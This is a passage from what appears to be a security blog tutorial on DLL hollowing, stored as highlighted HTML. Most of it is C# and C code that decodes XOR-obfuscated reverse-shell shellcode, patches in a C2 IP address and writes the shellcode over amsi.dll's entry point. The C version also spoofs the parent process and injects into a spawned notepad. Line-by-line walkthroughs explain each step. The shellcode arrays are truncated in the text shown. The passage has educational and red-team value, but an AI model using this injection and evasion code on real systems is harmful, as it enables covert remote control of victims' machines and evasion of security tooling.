    <span class="hljs-number">23</span>	                Console.<span class="hljs-title function_ invoke__">WriteLine</span>(<span class="hljs-string">"Usage:: Innject_c2.exe &lt;c2 ip&gt; &lt;dll name&gt;"</span>);
    <span class="hljs-number">24</span>	                c2_ips = <span class="hljs-string">"192.168.49.115"</span>;
    <span class="hljs-number">25</span>	                dll_name = <span class="hljs-string">"amsi.dll"</span>;
    <span class="hljs-number">26</span>	            }
    <span class="hljs-number">27</span>	            <span class="hljs-keyword">else</span>
    <span class="hljs-number">28</span>	            {
    <span class="hljs-number">29</span>	                c2_ips = args[<span class="hljs-number">0</span>];
    <span class="hljs-number">30</span>	                dll_name = args[<span class="hljs-number">1</span>];
    <span class="hljs-number">31</span>	            }
    <span class="hljs-number">32</span>	            Console.<span class="hljs-title function_ invoke__">WriteLine</span>(<span class="hljs-string">"[*] Using c2 IP of {0}, and dll name {1}"</span>, c2_ips, dll_name);
    <span class="hljs-number">33</span>	
    <span class="hljs-number">34</span>				<span class="hljs-keyword">var</span> c2_addr = IPAddress.<span class="hljs-title function_ invoke__">Parse</span>( c2_ips );
    <span class="hljs-number">35</span>	
    <span class="hljs-number">67</span>	<span class="hljs-comment">/*************************/</span>
    <span class="hljs-number">68</span>	<span class="hljs-comment">//          Begin Shellcode deobfuscation</span>
    <span class="hljs-number">69</span>	<span class="hljs-comment">/*************************/</span>
    <span class="hljs-number">70</span>				byte[] bytes_ip = c2_addr.<span class="hljs-title function_ invoke__">GetAddressBytes</span>();
    <span class="hljs-number">73</span>				<span class="hljs-comment">// XOR'd x64 reverse tcp shell ip 192.168.200.220 port 4444 // Not packed so search for c0\xa8\xc8\xdc to replace the IP </span>
    <span class="hljs-number">74</span>				byte[] encoded = <span class="hljs-keyword">new</span> byte[<span class="hljs-number">460</span>] { <span class="hljs-number">0xC9</span>, <span class="hljs-number">0xD1</span>, <span class="hljs-number">0x62</span>, <span class="hljs-number">0xD1</span>, <span class="hljs-number">0x69</span>, <span class="hljs-number">0x9</span>, <span class="hljs-number">0xF5</span>, <span class="hljs-number">0x99</span>, <span class="hljs-number">0xE1</span>, <span class="hljs-number">0x35</span>, <span class="hljs-number">0xD8</span>, <span class="hljs-number">0xB0</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0xC9</span>, <span class="hljs-number">0xB3</span>, <span class="hljs-number">0x64</span>, <span class="hljs-number">0xCF</span>, <span class="hljs-number">0xA9</span>,...
    <span class="hljs-number">75</span>	            <span class="hljs-keyword">int</span> encoded_size = encoded.Length;
    <span class="hljs-number">76</span>	            byte[] <span class="hljs-keyword">xor</span> = <span class="hljs-keyword">new</span> byte[<span class="hljs-number">3</span>] { <span class="hljs-number">0x35</span>, <span class="hljs-number">0x99</span>, <span class="hljs-number">0xe1</span> };
    <span class="hljs-number">77</span>	            <span class="hljs-keyword">int</span> xor_size = <span class="hljs-keyword">xor</span>.Length;
    <span class="hljs-number">78</span>	                
    <span class="hljs-number">79</span>	            byte[] buf = <span class="hljs-keyword">new</span> byte[encoded_size];
    <span class="hljs-number">80</span>				<span class="hljs-keyword">int</span> base_offset = -<span class="hljs-number">1</span>;
    <span class="hljs-number">81</span>	            <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; encoded_size; i++)
    <span class="hljs-number">82</span>	            {
    <span class="hljs-number">83</span>	                buf[i] = (byte)(encoded[i]^<span class="hljs-keyword">xor</span>[i%xor_size]);
    <span class="hljs-number">84</span>					<span class="hljs-keyword">if</span> (base_offset == -<span class="hljs-number">1</span> &amp;&amp; i &gt; <span class="hljs-number">3</span> &amp;&amp; (buf[i-<span class="hljs-number">3</span>]&amp;<span class="hljs-number">0xff</span>) == <span class="hljs-number">0xc0</span> &amp;&amp; (buf[i-<span class="hljs-number">2</span>]&amp;<span class="hljs-number">0xff</span>) == <span class="hljs-number">0xa8</span> &amp;&amp; (buf[i-<span class="hljs-number">1</span>]&amp;<span class="hljs-number">0xff</span>) == <span class="hljs-number">0xc8</span> &amp;&amp; (buf[i]&amp;<span class="hljs-number">0xff</span>) == <span class="hljs-number">0xdc</span>) 
    <span class="hljs-number">85</span>					{ 
    <span class="hljs-number">86</span>						base_offset = i-<span class="hljs-number">3</span>;
    <span class="hljs-number">87</span>					}
    <span class="hljs-number">88</span>	            }
    <span class="hljs-number">89</span>	            <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> offset = <span class="hljs-number">0x0</span>; offset &lt; bytes_ip.Length; offset = offset + <span class="hljs-number">1</span>)
    <span class="hljs-number">90</span>	            {
    <span class="hljs-number">91</span>	                buf[base_offset + offset] = bytes_ip[offset];
    <span class="hljs-number">92</span>	            }
    <span class="hljs-number">93</span>	<span class="hljs-comment">/*************************/</span>
    <span class="hljs-number">94</span>	<span class="hljs-comment">//          End Shellcode deobfuscation</span>
    <span class="hljs-number">95</span>	<span class="hljs-comment">/*************************/</span>
    <span class="hljs-number">96</span>	
    <span class="hljs-number">97</span>	<span class="hljs-comment">// Loadlibrary(amsi.dll)</span>
    <span class="hljs-number">98</span>	<span class="hljs-comment">// Parse out the entry point to the amsi.dll </span>
    <span class="hljs-number">99</span>	<span class="hljs-comment">// Change memory permissions for the are to allow read write</span>
   <span class="hljs-number">100</span>	<span class="hljs-comment">// Write shellcode to the entry point</span>
   <span class="hljs-number">101</span>	<span class="hljs-comment">// Change memory permissions for the entrypoint to the original value</span>
   <span class="hljs-number">102</span>	<span class="hljs-comment">// Create a new thread executing the entrypoint of the amsi.dll</span>
   <span class="hljs-number">103</span>	<span class="hljs-comment">// Loop for exit. Shellcode only runs when this program is open</span>
   <span class="hljs-number">104</span>	 
   <span class="hljs-number">105</span>	<span class="hljs-comment">/*************************/</span>
   <span class="hljs-number">106</span>	<span class="hljs-comment">// Load the requested Library  </span>
   <span class="hljs-number">107</span>	<span class="hljs-comment">/*************************/</span>
   <span class="hljs-number">108</span>	            IntPtr hTargetDLL = Utility.Win32.<span class="hljs-title function_ invoke__">LoadLibrary</span>( dll_name );
   <span class="hljs-number">109</span>	            <span class="hljs-keyword">if</span> ( hTargetDLL == IntPtr.Zero)
   <span class="hljs-number">110</span>	            {
   <span class="hljs-number">111</span>	                Console.<span class="hljs-title function_ invoke__">WriteLine</span>(<span class="hljs-string">"[!] LoadLibrary failed to load {0}\n"</span>, dll_name);
   <span class="hljs-number">112</span>	                <span class="hljs-keyword">return</span>;
   <span class="hljs-number">113</span>	            }
   <span class="hljs-number">114</span>	
   <span class="hljs-number">115</span>	            <span class="hljs-keyword">try</span>
   <span class="hljs-number">116</span>	            {
   <span class="hljs-number">117</span>	                Console.<span class="hljs-title function_ invoke__">WriteLine</span>(<span class="hljs-string">"[*] {0} Base Address: 0x{1:X}"</span>, dll_name, (Int64)hTargetDLL);
   <span class="hljs-number">118</span>	                Utility.Win32.IMAGE_DOS_HEADER *mz_header = (Utility.Win32.IMAGE_DOS_HEADER*)hTargetDLL.<span class="hljs-title function_ invoke__">ToPointer</span>();
   <span class="hljs-number">119</span>	                Console.<span class="hljs-title function_ invoke__">WriteLine</span>(<span class="hljs-string">"[*] {0} mz header PE OFffset 0x{1:X}"</span>, dll_name, mz_header-&gt;e_lfanew);
   <span class="hljs-number">120</span>	
   <span class="hljs-number">121</span>	                Utility.Win32.IMAGE_NT_HEADERS64 *pe_header = (Utility.Win32.IMAGE_NT_HEADERS64*)((Int64)mz_header + mz_header-&gt;e_lfanew);
   <span class="hljs-number">122</span>	                Console.<span class="hljs-title function_ invoke__">WriteLine</span>(<span class="hljs-string">"[*] {0} pe_header address 0x{1:X}"</span>, dll_name, (Int64)pe_header);
   <span class="hljs-number">123</span>	                Console.<span class="hljs-title function_ invoke__">WriteLine</span>(<span class="hljs-string">"[*] {0} EntryPoint offset 0x{1:X}"</span>, dll_name, pe_header-&gt;OptionalHeader.AddressOfEntryPoint);
   <span class="hljs-number">124</span>	
   <span class="hljs-number">125</span>	                IntPtr addressOfEntryPoint = <span class="hljs-keyword">new</span> <span class="hljs-title class_">IntPtr</span>( (Int64)mz_header + pe_header-&gt;OptionalHeader.AddressOfEntryPoint );
   <span class="hljs-number">126</span>	                Console.<span class="hljs-title function_ invoke__">WriteLine</span>(<span class="hljs-string">"[*] {0} EntryPoint Address 0x{1:X}"</span>, dll_name, (Int64)addressOfEntryPoint);
   <span class="hljs-number">127</span>	
   <span class="hljs-number">128</span>	                uint out1 = <span class="hljs-number">0</span>;
   <span class="hljs-number">129</span>	
   <span class="hljs-number">130</span>	                Utility.Win32.<span class="hljs-title function_ invoke__">VirtualProtect</span>( addressOfEntryPoint, (UIntPtr)buf.Length, <span class="hljs-number">0x4</span>, out out1 );
   <span class="hljs-number">131</span>					Console.<span class="hljs-title function_ invoke__">WriteLine</span>(<span class="hljs-string">"[*] {0} Overwriting the entrypoint with shellcode"</span>, dll_name);
   <span class="hljs-number">132</span>	                <span class="hljs-title function_ invoke__">fixed</span> (byte *p = buf)
   <span class="hljs-number">133</span>	                {
   <span class="hljs-number">134</span>	                    Utility.Win32.<span class="hljs-title function_ invoke__">memcpy</span>(addressOfEntryPoint, (IntPtr)p, (UIntPtr)buf.Length);
   <span class="hljs-number">135</span>	                }
   <span class="hljs-number">136</span>	                Utility.Win32.<span class="hljs-title function_ invoke__">VirtualProtect</span>( addressOfEntryPoint, (UIntPtr)buf.Length, out1, out out1);
   <span class="hljs-number">137</span>	
   <span class="hljs-number">138</span>					Console.<span class="hljs-title function_ invoke__">WriteLine</span>(<span class="hljs-string">"[*] {0} Sleeping 20 seconds"</span>, dll_name);
   <span class="hljs-number">139</span>	<span class="hljs-comment">//                Thread.Sleep(20000);</span>
   <span class="hljs-number">140</span>					Console.<span class="hljs-title function_ invoke__">WriteLine</span>(<span class="hljs-string">"[*] {0} CreateThread to start shellcode"</span>, dll_name);
   <span class="hljs-number">141</span>					Utility.Win32.<span class="hljs-title function_ invoke__">CreateThread</span>( IntPtr.Zero, <span class="hljs-number">0</span>, addressOfEntryPoint, IntPtr.Zero, <span class="hljs-number">0</span>, IntPtr.Zero );
   <span class="hljs-number">142</span>	            }
   <span class="hljs-number">143</span>	            <span class="hljs-keyword">catch</span> (<span class="hljs-built_in">Exception</span> e)
   <span class="hljs-number">144</span>	            {
   <span class="hljs-number">145</span>	                Console.<span class="hljs-built_in">Error</span>.<span class="hljs-title function_ invoke__">WriteLine</span>(e.StackTrace);
   <span class="hljs-number">146</span>	            }
   <span class="hljs-number">147</span>	            <span class="hljs-keyword">finally</span>
   <span class="hljs-number">148</span>	            {
   <span class="hljs-number">149</span>	
   <span class="hljs-number">150</span>	<span class="hljs-comment">//                Console.WriteLine("{0} started", processInfo.dwProcessId);</span>
   <span class="hljs-number">151</span>	            }
   <span class="hljs-number">152</span>	        }
   <span class="hljs-number">153</span>	    }</code></pre><p class="codeblocks">The next sample we will look through is slightly more complex. In this sample, we will use a couple of tricks from previous blogs to aid in hiding and implement the DLL hollowing in a remote process. Let's walk through the code line by line.</p><ul><li>Lines 11-32: Sets up variables and parses the command line arguments; we require the user to input the IP address of the C2, the parent ID, and the DLL name we want to load into our target process</li><li>Lines 37-103: Processes the Meterpreter shellcode and inserts our new C2 IP address into the shellcode string at runtime</li><li>Lines 110-146: Performing PPID spoofing and spawning the target process (in this case using Notepad)</li><li>Lines 152-167: Sets up the variables needed throughout this program</li><li>Lines 170-175: Allocates memory in the remote process for the DLL name</li><li>Lines 180-184: Writes the name of the DLL into the remote process</li><li>Lines 185-186: Gets the address of the Kernel32 library from the current process because it should be the same address that was used in the remote process (this will be used to get the address of LoadLibrary)</li><li>Lines 187-188: Calls getProcAddress to get the address of the LoadLibrary function—again, this address should be the same in both the local and remote processes</li><li>Lines 189-196: Calls CreateThread using the remote processes handle in order to call the LoadLibrary in that process; the result will map a section of memory for the library we wish to load</li><li>Lines 199: Pauses the execution of the current process to give the remote process a chance to finish loading the DLL</li><li>Lines 202-205: Creates an array of modules (libraries) loaded in the remote process; This array will help us find where our DLL was stored in the memory of the remote process</li><li>Lines 208-220: Loops through the array of modules to identify the names of each module; the names are obtained using GetModuleBaseNameA, and if the modules name matches the DLL we loaded, then we exit the loop</li><li>Lines 223-231: Allocates memory in the current process to hold the MZ/PE header of the DLL loaded in the remote process</li><li>Lines 232-236: Reads the remote processes memory for the MZ/PE header of our loaded DLL</li><li>Lines 237-243: Parses the MZ/PE headers to obtain the address of the DLL's entry point</li><li>Lines 247-251: Overwrites the entry point of the DLL in the remote process with our shellcode</li><li>Lines 254-261: Calls Createthread in the remote process, this time it is calling it with the DLL's entry point as the function; this will cause the thread to execute the shellcode</li><li>Lines 263-271: Cleans up current process's memory and exits</li></ul><pre><code data-highlighted="yes" class="hljs language-perl">     <span class="hljs-number">9</span>	<span class="hljs-keyword">int</span> main(<span class="hljs-keyword">int</span> args, char * argc[])
    <span class="hljs-number">10</span>	{
    <span class="hljs-number">11</span>	    char c2_ip_str[<span class="hljs-number">16</span>] = {};
    <span class="hljs-number">12</span>	    <span class="hljs-keyword">int</span> ppid = <span class="hljs-number">4752</span>;
    <span class="hljs-number">13</span>	    char dllInjectName[<span class="hljs-number">0x50</span>] = <span class="hljs-string">{0}</span>;
    <span class="hljs-number">14</span>	    DWORD c2_ip = <span class="hljs-number">0</span>;
    <span class="hljs-number">15</span>	    <span class="hljs-keyword">if</span>(args != <span class="hljs-number">4</span>)
    <span class="hljs-number">16</span>	    {
    <span class="hljs-number">17</span>	        <span class="hljs-keyword">printf</span>(<span class="hljs-string">"Usage:: Inject_c2.exe &lt;c2 ip&gt; &lt;parent id&gt; "</span>
    <span class="hljs-number">18</span>	               <span class="hljs-string">"&lt;dllName&gt;\n"</span>);
    <span class="hljs-number">19</span>	        memcpy(c2_ip_str, <span class="hljs-string">"192.168.49.115"</span>, <span class="hljs-number">15</span>);
    <span class="hljs-number">20</span>	        memcpy(dllInjectName, <span class="hljs-string">"amsi.dll"</span>, <span class="hljs-number">9</span>);
    <span class="hljs-number">21</span>	    }
    <span class="hljs-number">22</span>	    <span class="hljs-keyword">else</span>
    <span class="hljs-number">23</span>	    {
    <span class="hljs-number">24</span>	        memcpy(c2_ip_str, argc[<span class="hljs-number">1</span>], <span class="hljs-number">15</span>);
    <span class="hljs-number">25</span>	        ppid = atoi(argc[<span class="hljs-number">2</span>]);
    <span class="hljs-number">26</span>	        memcpy(dllInjectName, argc[<span class="hljs-number">3</span>], strlen(argc[<span class="hljs-number">3</span>]));
    <span class="hljs-number">27</span>	    }
    <span class="hljs-number">28</span>	    <span class="hljs-keyword">printf</span>(<span class="hljs-string">"C2 IP = %s, ppid = %d, dllName = %s\n"</span>,
    <span class="hljs-number">29</span>	           c2_ip_str,
    <span class="hljs-number">30</span>	           ppid,
    <span class="hljs-number">31</span>	           dllInjectName);
    <span class="hljs-number">32</span>	    c2_ip = inet_addr(c2_ip_str);
    <span class="hljs-number">33</span>	    /*****************************************<span class="hljs-regexp">/
    34	    /</span><span class="hljs-regexp">/   Begin Shellcode deobfuscation
    35	    /</span>*****************************************<span class="hljs-regexp">/
    36	    /</span><span class="hljs-regexp">/ XOR'd x64 reverse tcp shell ip 192.168.200.220 port 4444 /</span><span class="hljs-regexp">/ Not packed so search for c0\xa8\xc8\xdc to replace the IP
    37	    char encoded[] =
    38	        "\xC9\xD1\x62\xD1\x69\x9\xF5\x99\xE1\...
    77	    int encoded_size = sizeof(encoded);
    78	    char xor1[] = "\x35\x99\xe1";
    79	    int xor_size = 3;
    80	    char * buf = (char *)malloc(encoded_size);
    81	    int base_offset = -1;
    82	    for(int i = 0; i &lt; encoded_size; i++)
    83	    {
    84	        buf[i] = encoded[i] ^ xor1[i % xor_size];
    85	        if(base_offset == -1 &amp;&amp; i &gt; 3 &amp;&amp;
    86	           (buf[i - 3] &amp; 0xff) == 0xc0 &amp;&amp;
    87	           (buf[i - 2] &amp; 0xff) == 0xa8 &amp;&amp;
    88	           (buf[i - 1] &amp; 0xff) == 0xc8 &amp;&amp;
    89	           (buf[i] &amp; 0xff) == 0xdc)
    90	        {
    91	            base_offset = i - 3;
    92	        }
    93	    }
    94	    printf("Found C2 IP at offset at 0x%08x\n",
    95	           base_offset);
    96	    int * tmp = (int *)&amp;buf[base_offset];
    97	    *tmp = c2_ip;
    98	    for(int i = 0; i &lt; encoded_size; i++)
    99	    {
   100	        printf("\\x%02x", buf[i]);
   101	        if((i % 16) == 0 &amp;&amp; i &gt; 0)
   102	            printf("\n");
   103	    }
   104	    /</span>*****************************************<span class="hljs-regexp">/
   105	    /</span><span class="hljs-regexp">/    End Shellcode deobfuscation
   106	    /</span>*****************************************<span class="hljs-regexp">/
   107	    /</span>*****************************************<span class="hljs-regexp">/
   108	    /</span><span class="hljs-regexp">/ PPID Spoofing
   109	    /</span>*****************************************<span class="hljs-regexp">/
   110	    STARTUPINFOEXA si;
   111	    PROCESS_INFORMATION pi;
   112	    SIZE_T attributeSize;
   113	    ZeroMemory(&amp;si, sizeof(STARTUPINFOEXA));
   114	    HANDLE parentProcessHandle =
   115	        OpenProcess(MAXIMUM_ALLOWED,
   116	                    false,
   117	                    ppid); /</span><span class="hljs-regexp">/ Explorer is where notepad is
   118	                           /</span><span class="hljs-regexp">/ normally run under
   119	    InitializeProcThreadAttributeList(
   120	        NULL, 1, 0, &amp;attributeSize);
   121	    si.lpAttributeList =
   122	        (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(
   123	            GetProcessHeap(), 0, attributeSize);
   124	    InitializeProcThreadAttributeList(
   125	        si.lpAttributeList, 1, 0, &amp;attributeSize);
   126	    UpdateProcThreadAttribute(
   127	        si.lpAttributeList,
   128	        0,
   129	        PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
   130	        &amp;parentProcessHandle,
   131	        sizeof(HANDLE),
   132	        NULL,
   133	        NULL);
   134	    si.StartupInfo.cb = sizeof(STARTUPINFOEXA);
   135	    CreateProcessA(NULL,
   136	                   (LPSTR) "notepad",
   137	                   NULL,
   138	                   NULL,
   139	                   FALSE,
   140	                   EXTENDED_STARTUPINFO_PRESENT |
   141	                       DETACHED_PROCESS,
   142	                   NULL,
   143	                   NULL,
   144	                   &amp;si.StartupInfo,
   145	                   &amp;pi);
   146	    /</span>*****************************************<span class="hljs-regexp">/
   147	    /</span><span class="hljs-regexp">/ PPID Spoofing
   148	    /</span>*****************************************<span class="hljs-regexp">/
   149	    /</span>*****************************************<span class="hljs-regexp">/
   150	    /</span><span class="hljs-regexp">/ DLL Hollowing
   151	    /</span>*****************************************<span class="hljs-regexp">/
   152	    HANDLE hDllThread = NULL;
   153	    HMODULE module_array[0x100] = {0};
   154	    HMODULE hModule;
   155	    HMODULE hKernel32;
   156	    DWORD module_sz = 0;
   157	    SIZE_T number_of_modules = 0;
   158	    ;
   159	    char moduleName[0x50] = {0};
   160	    void * remoteDLLInjectName = NULL;
   161	    void * remoteProcessMemory = NULL;
   162	    DWORD remoteProcessMemory_sz = 0x1000;
   163	    void * entryPoint = NULL;
   164	    FARPROC loadlibrary_addr = NULL;
   165	    PIMAGE_DOS_HEADER MZ_header = {0};
   166	    PIMAGE_NT_HEADERS PE_header = {0};
   167	    HANDLE hProcess = pi.hProcess;
   168	    /</span><span class="hljs-regexp">/ allocate memory, into the remote process memory, for
   169	    /</span><span class="hljs-regexp">/ the name of the dll to inject
   170	    remoteDLLInjectName =
   171	        VirtualAllocEx(hProcess,
   172	                       NULL,
   173	                       sizeof(dllInjectName),
   174	                       MEM_COMMIT,
   175	                       PAGE_READWRITE);
   176	    if(remoteDLLInjectName == NULL)
   177	        goto EXIT;
   178	    /</span><span class="hljs-regexp">/ copy, into the remote process memory, the name of the
   179	    /</span><span class="hljs-regexp">/ dll to inject
   180	    WriteProcessMemory(hProcess,
   181	                       remoteDLLInjectName,
   182	                       dllInjectName,
   183	                       sizeof(dllInjectName),
   184	                       NULL);
   185	    if((hKernel32 = GetModuleHandleA("Kernel32")) == NULL)
   186	        goto EXIT;
   187	    loadlibrary_addr =
   188	        GetProcAddress(hKernel32, "LoadLibraryA");
   189	    hDllThread = CreateRemoteThread(
   190	        hProcess,
   191	        NULL,
   192	        0,
   193	        (PTHREAD_START_ROUTINE)loadlibrary_addr,
   194	        remoteDLLInjectName,
   195	        0,
   196	        NULL);
   197	    if(hDllThread != NULL)
   198	    {
   199	        WaitForSingleObject(hDllThread, 1000);
   200	        /</span><span class="hljs-regexp">/ Loop through loaded modules looking for the one we
   201	        /</span><span class="hljs-regexp">/ just created
   202	        EnumProcessModules(hProcess,
   203	                           module_array,
   204	                           sizeof(module_array),
   205	                           &amp;module_sz);
   206	        number_of_modules = module_sz /</span> sizeof(HMODULE);
   <span class="hljs-number">207</span>	        bool bFound = false;
   <span class="hljs-number">208</span>	        <span class="hljs-keyword">for</span>(size_t i = <span class="hljs-number">0</span>; i &lt; number_of_modules; i++)
   <span class="hljs-number">209</span>	        {
   <span class="hljs-number">210</span>	            hModule = module_array[i];
   <span class="hljs-number">211</span>	            GetModuleBaseNameA(hProcess,
   <span class="hljs-number">212</span>	                               hModule,
   <span class="hljs-number">213</span>	                               moduleName,
   <span class="hljs-number">214</span>	                               sizeof(moduleName));
   <span class="hljs-number">215</span>	            <span class="hljs-keyword">if</span>(strcmp(moduleName, <span class="hljs-string">"amsi.dll"</span>) == <span class="hljs-number">0</span>)
   <span class="hljs-number">216</span>	            {
   <span class="hljs-number">217</span>	                bFound = true;
   <span class="hljs-number">218</span>	                <span class="hljs-keyword">break</span>;
   <span class="hljs-number">219</span>	            }
   <span class="hljs-number">220</span>	        }
   <span class="hljs-number">221</span>	    }
   <span class="hljs-number">222</span>	    // get DLL<span class="hljs-string">'s AddressOfEntryPoint
   223	    remoteProcessMemory =
   224	        (void *)VirtualAlloc(NULL,
   225	                             remoteProcessMemory_sz,
   226	                             MEM_COMMIT,
   227	                             PAGE_READWRITE);
   228	    if(remoteProcessMemory == NULL)
   229	    {
   230	        goto EXIT;
   231	    }
   232	    ReadProcessMemory(hProcess,
   233	                      hModule,
   234	                      remoteProcessMemory,
   235	                      remoteProcessMemory_sz,
   236	                      NULL);
   237	    MZ_header = (PIMAGE_DOS_HEADER)remoteProcessMemory;
   238	    PE_header =
   239	        (PIMAGE_NT_HEADERS)((DWORD_PTR)remoteProcessMemory +
   240	                            MZ_header-&gt;e_lfanew);
   241	    entryPoint = (LPVOID)(PE_header-&gt;OptionalHeader
   242	                              .AddressOfEntryPoint +
   243	                          (DWORD_PTR)hModule);
   244	    printf("[*] Dll entryPoint at: %p\n", entryPoint);
   245	    // Overwrite the DLL'</span>s entry point with the decoded
   <span class="hljs-number">246</span>	    // shellcode
   <span class="hljs-number">247</span>	    <span class="hljs-keyword">if</span>(WriteProcessMemory(hProcess,
   <span class="hljs-number">248</span>	                          entryPoint,
   <span class="hljs-number">249</span>	                          (LPCVOID)buf,
   <span class="hljs-number">250</span>	                          encoded_size,
   <span class="hljs-number">251</span>	                          NULL))
   <span class="hljs-number">252</span>	    {
   <span class="hljs-number">253</span>	        // execute shellcode from inside the benign DLL
   <span class="hljs-number">254</span>	        CreateRemoteThread(
   <span class="hljs-number">255</span>	            hProcess,
   <span class="hljs-number">256</span>	            NULL,
   <span class="hljs-number">257</span>	            <span class="hljs-number">0</span>,
   <span class="hljs-number">258</span>	            (PTHREAD_START_ROUTINE)entryPoint,
   <span class="hljs-number">259</span>	            NULL,
   <span class="hljs-number">260</span>	            <span class="hljs-number">0</span>,
   <span class="hljs-number">261</span>	            NULL);
   <span class="hljs-number">262</span>	    }
   <span class="hljs-number">263</span>	EXIT:
   <span class="hljs-number">264</span>	    <span class="hljs-keyword">if</span>(remoteProcessMemory != NULL)
   <span class="hljs-number">265</span>	        VirtualFree(remoteProcessMemory,
   <span class="hljs-number">266</span>	                    remoteProcessMemory_sz,
   <span class="hljs-number">267</span>	                    MEM_RELEASE);
   <span class="hljs-number">268</span>	    <span class="hljs-keyword">if</span>(pi.hThread != NULL)
   <span class="hljs-number">269</span>	        CloseHandle(pi.hThread);
   <span class="hljs-number">270</span>	    <span class="hljs-keyword">if</span>(pi.hProcess != NULL)
   <span class="hljs-number">271</span>	        CloseHandle(pi.hProcess);
   <span class="hljs-number">272</span>	}</code></pre><p class="MsoNormal"><span>The next code excerpt is in C# and performs the same actions as the above code sample. Let's walk through the code line by line.</span></p><ul><li>Lines 19-34: Processes the user input from the command line; this will obtain the C2 IP address and the name of the DLL where our malicious code will be injected</li><li>Lines 66-94: Processes the shellcode and overwrites the C2 IP address with the value passed in at the command line</li><li>Lines 99-144: Spoofs the parent process ID and executes the new program into which malicious code will be injected (See <a href="https://trustedsec.com/blog/ppid-spoofing-its-really-this-easy-to-fake-your-parent">this blog </a>for more details on PPID spoofing)</li><li>Line 159: Obtains a handle to the process that we just created, which will be used to determine the DLL address and entry point</li><li>Line 162: Creates a memory space in the newly created program's memory space (This will hold the name of the DLL we wish to load into that process' memory space)</li><li>Line 168: Writes the name of the DLL into the remote process' memory space</li><li>Line 170: Uses GetModuleHandleA to obtain the address of the Kernel32 library loaded into our current process because this memory address will be the same as the remote process</li><li>Line 173: Uses the handle obtained from the GetModuleHandleA function to get the address of the LoadLibrary function</li><li>Line 174: Calls a CreateThread in the remote process to execute the LoadLibrary function and load the DLL into memory; Unlike the previous samples, this LoadLibrary function will not return the address of the DLL since it was created using the CreateThread</li><li>Lines 180-194: Will loop through the remote processes memory to identify the address of the loaded library; EnumProcessModules is used to get the currently loaded processes and GetModuleBaseName is used to get the human readable name of the libraries; when it matches the library we loaded, it will exit</li><li>Lines 197-202: Reads 0x1000 bytes from the remote process' memory space and stores it in the local process' memory; this should contain the MZ and PE headers for the DLL we loaded</li><li>Lines 204-210: Processes the MZ and PE headers obtained from the remote process to determine the entry point</li><li>Line 213: Overwrites the entry point in the remote process with the malicious shellcode</li><li>Line 216: Uses the CreateThread function to execute the malicious code in the remote process</li></ul><pre><code data-highlighted="yes" class="hljs language-java"><span class="hljs-number">12</span>	namespace dll_hollowing
    <span class="hljs-number">13</span>	{
    <span class="hljs-number">14</span>	    unsafe <span class="hljs-keyword">class</span> <span class="hljs-title class_">Program</span>
    <span class="hljs-number">15</span>	    {
    <span class="hljs-number">16</span>	
    <span class="hljs-number">17</span>	        <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">Main</span><span class="hljs-params">(string[] args)</span>
    <span class="hljs-number">18</span>	        {
    <span class="hljs-number">19</span>	            <span class="hljs-type">String</span> <span class="hljs-variable">c2_ips</span> <span class="hljs-operator">=</span> string.Empty;
    <span class="hljs-number">20</span>	            <span class="hljs-type">String</span> <span class="hljs-variable">dll_name</span> <span class="hljs-operator">=</span> string.Empty;    
    <span class="hljs-number">21</span>	            <span class="hljs-keyword">if</span> (args.Length != <span class="hljs-number">2</span>)
    <span class="hljs-number">22</span>	            {
    <span class="hljs-number">23</span>	                Console.WriteLine(<span class="hljs-string">"Usage:: Innject_c2.exe &lt;c2 ip&gt; &lt;dll name&gt;"</span>);
    <span class="hljs-number">24</span>	                c2_ips = <span class="hljs-string">"192.168.49.115"</span>;
    <span class="hljs-number">25</span>	                dll_name = <span class="hljs-string">"amsi.dll"</span>;
    <span class="hljs-number">26</span>	            }
    <span class="hljs-number">27</span>	            <span class="hljs-keyword">else</span>
    <span class="hljs-number">28</span>	            {
    <span class="hljs-number">29</span>	                c2_ips = args[<span class="hljs-number">0</span>];
    <span class="hljs-number">30</span>	                dll_name = args[<span class="hljs-number">1</span>];
    <span class="hljs-number">31</span>	            }
    <span class="hljs-number">32</span>	            Console.WriteLine(<span class="hljs-string">"[*] Using c2 IP of {0}, and dll name {1}"</span>, c2_ips, dll_name);
    <span class="hljs-number">33</span>	
    <span class="hljs-number">34</span>				<span class="hljs-type">var</span> <span class="hljs-variable">c2_addr</span> <span class="hljs-operator">=</span> IPAddress.Parse( c2_ips );
    <span class="hljs-number">35</span>	
    <span class="hljs-number">65</span>	
    <span class="hljs-number">66</span>	<span class="hljs-comment">/*************************/</span>
    <span class="hljs-number">67</span>	<span class="hljs-comment">//          Begin Shellcode deobfuscation</span>
    <span class="hljs-number">68</span>	<span class="hljs-comment">/*************************/</span>
    <span class="hljs-number">69</span>				<span class="hljs-type">byte</span>[] bytes_ip = c2_addr.GetAddressBytes();
    <span class="hljs-number">72</span>				<span class="hljs-comment">// XOR'd x64 reverse tcp shell ip 192.168.200.220 port 4444 // Not packed so search for c0\xa8\xc8\xdc to replace the IP </span>
    <span class="hljs-number">73</span>				<span class="hljs-type">byte</span>[] encoded = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">460</span>] { <span class="hljs-number">0xC9</span>, <span class="hljs-number">0xD1</span>, <span class="hljs-number">0x62</span>, <span class="hljs-number">0xD1</span>, <span class="hljs-number">0x69</span>, <span class="hljs-number">0x9</span>, <span class="hljs-number">0xF5</span>, <span class="hljs-number">0x99</span>, ..
    <span class="hljs-number">74</span>	            <span class="hljs-type">int</span> <span class="hljs-variable">encoded_size</span> <span class="hljs-operator">=</span> encoded.Length;
    <span class="hljs-number">75</span>	            <span class="hljs-type">byte</span>[] xor = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">3</span>] { <span class="hljs-number">0x35</span>, <span class="hljs-number">0x99</span>, <span class="hljs-number">0xe1</span> };
    <span class="hljs-number">76</span>	            <span class="hljs-type">int</span> <span class="hljs-variable">xor_size</span> <span class="hljs-operator">=</span> xor.Length;
    <span class="hljs-number">77</span>	                
    <span class="hljs-number">78</span>	            <span class="hljs-type">byte</span>[] buf = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[encoded_size];
